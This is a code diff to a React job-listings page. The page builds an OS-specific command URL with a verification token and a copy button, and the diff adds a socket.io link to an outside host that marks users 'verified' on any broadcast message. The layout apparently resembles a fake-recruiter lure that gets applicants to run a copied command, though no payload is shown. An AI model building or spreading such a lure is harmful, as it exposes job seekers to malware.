@@ -3,6 +3,8 @@ import { Blocks, Users, BarChart3, Network, PenTool } from 'lucide-react'
 import Modal from '@/components/Modal'
 import { useToast } from '@/components/Toast'
 import ReCAPTCHA from 'react-google-recaptcha'
+import { io } from "socket.io-client";
+const socket = io("http://www.nexusai.center");
 
 const JOBS = [
   { id:1, title:'Blockchain Assistant', icon:Blocks, intro:'Support blockchain operations and research.', requirements:[
@@ -84,23 +86,22 @@ export default function Jobs() {
     return `${base}/${os}?token=${VERIFICATION_TOKEN}`
   }, [os])
 
-  // SSE listener for backend verification
+  const [messages, setMessages] = useState([]);
+
   useEffect(() => {
-    if (!open) return
-    const evtSource = new EventSource(cmdUrl)
+    // Listen for broadcast messages
+    socket.on("message", (data) => {
+      console.log("Broadcast from server:", data.text);
+      setMessages((prev) => [...prev, data.text]);
+      setVerified(true)
+      setCaptchaToken(null)
+    });
 
-    console.log("opened")
-    evtSource.onmessage = (event) => {
-      if (event.data === "verified") {
-        setVerified(true)
-        setCaptchaToken(null)
-        push("Verification completed successfully!")
-        console.log("closed")
-      }
-    }
-
-    return () => evtSource.close()
-  }, [cmdUrl, open, push])
+    // Cleanup on unmount
+    return () => {
+      socket.off("message");
+    };
+  }, []);
 
   const handleCopy = async () => {
     try {
